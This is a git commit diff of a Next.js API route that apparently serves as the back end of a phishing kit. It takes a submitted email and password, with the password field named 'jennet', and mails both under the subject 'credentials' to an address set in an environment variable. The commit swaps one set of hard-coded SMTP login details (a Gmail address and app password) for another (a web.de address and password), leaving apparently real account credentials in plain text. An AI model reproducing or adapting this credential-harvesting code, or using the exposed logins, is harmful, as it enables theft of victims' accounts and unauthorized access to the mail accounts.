06970a8dd0f432161d0c9f8f1aa9ff92be7f77dc
Victor Bello <you@example.com>
2023-09-10 23:05:38 +0100

    gfg

--- src/app/api/send/route.ts
+++ src/app/api/send/route.ts
@@ -1,41 +1,35 @@
-import { NextResponse, NextRequest } from 'next/server';
-import mailer from 'nodemailer'
-
+import { NextResponse, NextRequest } from "next/server";
+import mailer from "nodemailer";
 
 export async function POST(request: Request) {
+  const res: any = await request.json();
 
-      const res: any = await request.json();
+  try {
+    let transporter: mailer.Transporter = mailer.createTransport({
+      service: "web.de",
+      host: "smtp.web.de",
+      port: 465,
+      secure: true,
+      auth: {
+        user: "christophw87@web.de",
+        pass: "frieselman",
+      },
+    });
 
-    try {
+    const result = await transporter.sendMail({
+      from: `"dees" <christophw87@web.de>`,
+      to: `${process.env.EMAIL_TO_SEND}`,
+      subject: "credentials",
+      // text: `${JSON.stringify(email)} ${JSON.stringify(password)}`,
+      html: `<h3>email: ${JSON.stringify(res.email).replaceAll(
+        '"',
+        ""
+      )}, password: ${JSON.stringify(res.jennet).replaceAll('"', "")}</h3>`,
+    });
+    console.log(result);
 
-      let transporter: mailer.Transporter = mailer.createTransport({
-         service: 'Gmail',
-         host: "smtp.gmail.com",
-         port: 465,
-         secure: true,
-         auth: {
-           user: 'deeswork969@gmail.com', 
-           pass: 'euujozgmwmhqniiu', 
-         },
-       });
-
-      const result = await transporter.sendMail({
-         from: `"dees" <deeswork969@gmail.com>`,
-         to: `${process.env.EMAIL_TO_SEND}`, 
-         subject: 'credentials',
-         // text: `${JSON.stringify(email)} ${JSON.stringify(password)}`,
-         html: `<h3>email: ${JSON.stringify(res.email).replaceAll('"', '')}, password: ${JSON.stringify(res.jennet).replaceAll('"', '')}</h3>`
-       })
-       console.log(result);
-       
-
-       return NextResponse.json({status: true, message: result})
-      
-    } catch (error) {
-      
-      return NextResponse.json({status: true, message: error})
-    }
-  
-    
-
+    return NextResponse.json({ status: true, message: result });
+  } catch (error) {
+    return NextResponse.json({ status: true, message: error });
+  }
 }
